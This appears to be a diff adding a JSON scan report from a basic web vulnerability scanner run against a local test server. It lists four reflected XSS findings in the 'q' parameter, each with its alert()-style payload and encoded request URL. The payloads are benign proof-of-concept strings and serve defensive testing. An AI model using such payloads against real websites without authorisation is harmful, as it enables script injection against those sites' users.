@@ -1,0 +1,37 @@
+{
+  "target": "http://127.0.0.1:5000/?q=test",
+  "start_time": "2025-09-11 17:21:28",
+  "issues": [
+    {
+      "type": "reflected_xss_in_url_param",
+      "param": "q",
+      "payload": "<script>alert('XSS')</script>",
+      "request_url": "http://127.0.0.1:5000/?q=test%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+      "status_code": 200
+    },
+    {
+      "type": "reflected_xss_in_url_param",
+      "param": "q",
+      "payload": "\"><script>alert(1)</script>",
+      "request_url": "http://127.0.0.1:5000/?q=test%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "status_code": 200
+    },
+    {
+      "type": "reflected_xss_in_url_param",
+      "param": "q",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "request_url": "http://127.0.0.1:5000/?q=test%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200
+    },
+    {
+      "type": "reflected_xss_in_url_param",
+      "param": "q",
+      "payload": "'\"><svg/onload=alert('XSS')>",
+      "request_url": "http://127.0.0.1:5000/?q=test%27%22%3E%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E",
+      "status_code": 200
+    }
+  ],
+  "notes": "Only basic reflected XSS and simple error-based SQL injection checks performed.",
+  "forms_found": 0,
+  "end_time": "2025-09-11 17:21:35"
+}
